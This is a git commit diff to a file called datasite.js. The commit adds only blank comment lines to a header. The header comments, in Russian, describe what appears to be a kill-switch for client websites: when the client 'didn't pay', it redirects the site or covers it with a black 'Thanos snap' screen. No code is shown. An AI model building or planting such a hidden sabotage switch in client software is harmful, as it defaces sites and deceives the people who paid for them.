de7cd0341ae1f43620a043b166f9340c54d3621e
Daniel <72696191+deusnotam@users.noreply.github.com>
2024-02-17 12:14:18 +0100

    Update datasite.js

--- datasite.js
+++ datasite.js
@@ -2,8 +2,10 @@
  * DataSite.js
  * by Deus Notam
  * Telegram → https://t.me/d3usn0tam
+ * 
  * Доступные причины:
  * didnt pay - не оплата работы
+ *
  * Доступные эффекты:
  * redirect - редирект на redirecturl
  * thanos - поверх сайта чёрный экран с gif щелком таноса
